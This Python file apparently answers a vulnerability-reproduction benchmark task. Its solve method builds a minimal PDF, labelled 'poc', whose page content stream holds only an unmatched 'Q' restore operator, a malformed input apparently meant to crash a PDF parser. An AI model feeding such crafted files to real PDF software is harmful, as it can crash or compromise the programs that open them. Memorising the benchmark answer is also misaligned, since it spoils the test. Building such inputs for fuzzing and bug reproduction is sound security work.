class Solution:
    def solve(self, src_path: str) -> bytes:
        header = "%PDF-1.4\n".encode('ascii')
        obj1 = """1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
""".encode('ascii')
        obj2 = """2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
""".encode('ascii')
        obj3 = """3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>
endobj
""".encode('ascii')
        stream_content = b"Q"
        stream_length = len(stream_content)
        obj4_prefix = f"""4 0 obj
<< /Length {stream_length} >>
stream
""".encode('ascii')
        obj4 = obj4_prefix + stream_content + b"\nendstream\nendobj\n"
        full_before_xref = header + obj1 + obj2 + obj3 + obj4
        xref_offset = len(full_before_xref)
        def pad_offset(off):
            return f"{off:010d}".encode('ascii')
        xref_lines = [
            b"xref",
            b"0 5",
            pad_offset(0) + b" 65535 f",
            pad_offset(len(header)) + b" 00000 n",
            pad_offset(len(header) + len(obj1)) + b" 00000 n",
            pad_offset(len(header) + len(obj1) + len(obj2)) + b" 00000 n",
            pad_offset(len(header) + len(obj1) + len(obj2) + len(obj3)) + b" 00000 n"
        ]
        xref = b'\n'.join(xref_lines) + b'\n'
        trailer = f"""trailer
<< /Size 5 /Root 1 0 R >>
startxref
{xref_offset}
%%EOF
""".encode('ascii')
        poc = full_before_xref + xref + trailer
        return poc